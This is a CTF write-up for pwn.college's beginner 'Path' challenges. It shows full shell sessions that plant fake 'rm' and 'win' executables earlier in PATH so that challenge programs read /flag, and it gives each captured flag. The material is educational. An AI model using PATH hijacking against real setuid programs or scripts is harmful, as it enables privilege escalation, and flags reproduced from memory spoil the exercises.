# Pondering Path

## 1. The PATH Variable

### Solve
**Flag** `pwn.college{kWRWG4LdZ40CH5IcH2mcg29pTR-.QX2cDM1wCMwEzNzEzW}`

```bash
hacker@path~the-path-variable:~$ mkdir -p ~/fakebin
hacker@path~the-path-variable:~$ cat > ~/fakebin/rm <<'EOF'
> exit 0
> EOf
> EOF
hacker@path~the-path-variable:~$ chmod +x ~/fakebin/rm
hacker@path~the-path-variable:~$ PATH="$HOME/fakebin:$PATH" /challenge/run
Trying to remove /flag...
The flag is still there! I might as well give it to you!
pwn.college{kWRWG4LdZ40CH5IcH2mcg29pTR-.QX2cDM1wCMwEzNzEzW}
```

## 2. Setting PATH

### Solve
**Flag** `pwn.college{s-oyaj1ixKW9MZ-YtIC0J07272H.QX1cjM1wCMwEzNzEzW}`

```bash
hacker@path~setting-path:~$  ls -l /challenge/more_commands
total 4
-rwsr-xr-x 1 root root 281 Jan 14  2025 win
hacker@path~setting-path:~$ PATH=/challenge/more_commands /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{s-oyaj1ixKW9MZ-YtIC0J07272H.QX1cjM1wCMwEzNzEzW}
```

## 3. Finding Commands

### Solve
**Flag** `pwn.college{8kaG_vhGdB8soF-8eancuoBOjQL.01NzEzNxwCMwEzNzEzW}`

```bash
hacker@path~finding-commands:~$ dir="$(dirname "$(readlink -f "$(which win)")")"
hacker@path~finding-commands:~$ cat "$dir/flag"
pwn.college{8kaG_vhGdB8soF-8eancuoBOjQL.01NzEzNxwCMwEzNzEzW}
```

## 4. Adding Commands

### Solve
**Flag** `pwn.college{A56TqgOVCBkAEthVfusMS88_Rup.QX2cjM1wCMwEzNzEzW}`

```bash
hacker@path~adding-commands:~$ mkdir -p ~/winbin
hacker@path~adding-commands:~$  cat > ~/winbin/win <<'EOF'
> read -r FLAG </flag
> printf '%s\n' "$FLAG"
> EOF
hacker@path~adding-commands:~$ chmod +x ~/winbin/win
hacker@path~adding-commands:~$ PATH="$HOME/winbin" /challenge/run
Invoking 'win'....
pwn.college{A56TqgOVCBkAEthVfusMS88_Rup.QX2cjM1wCMwEzNzEzW}
```

## 5. Hijacking Commands

### Solve
**Flag** `pwn.college{AvJZbpm4AfjGvSzxEq8j69hqMHl.QX3cjM1wCMwEzNzEzW}`

```bash
hacker@path~hijacking-commands:~$ echo "/run/dojo/bin/cat /flag" > rm
hacker@path~hijacking-commands:~$ chmod +x rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{AvJZbpm4AfjGvSzxEq8j69hqMHl.QX3cjM1wCMwEzNzEzW}
```
